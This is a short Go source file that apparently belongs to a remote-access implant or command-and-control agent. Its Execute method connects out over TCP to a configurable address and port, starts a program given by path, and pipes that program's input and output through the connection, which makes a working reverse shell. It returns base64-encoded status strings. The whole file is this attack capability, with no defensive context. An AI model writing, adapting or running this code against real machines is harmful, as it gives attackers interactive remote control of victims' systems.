package types

import (
	"encoding/base64"
	"fmt"
	"net"
	"os/exec"
)

type ShellSessionDetails struct {
	Path string
	Addr string
	Port string
}

func (s *ShellSessionDetails) Execute() *Result {
	r := new(Result)
	sessionConn, err := net.Dial("tcp", s.Addr+":"+s.Port)
	if err != nil {
		r.Result = base64.StdEncoding.EncodeToString([]byte(err.Error()))
		return r
	}
	sessionCmd := exec.Command(s.Path)
	sessionCmd.Stdin = sessionConn
	sessionCmd.Stdout = sessionConn
	sessionCmd.Stderr = sessionConn
	err = sessionCmd.Start()
	if err != nil {
		r.Result = base64.StdEncoding.EncodeToString([]byte(err.Error()))
		return r
	}
	err = sessionCmd.Wait()
	if err != nil {
		r.Result = base64.StdEncoding.EncodeToString([]byte(err.Error()))
		return r
	}
	resultString := fmt.Sprintf("Shell session completed without error")
	r.Result = base64.StdEncoding.EncodeToString([]byte(resultString))
	return r
}
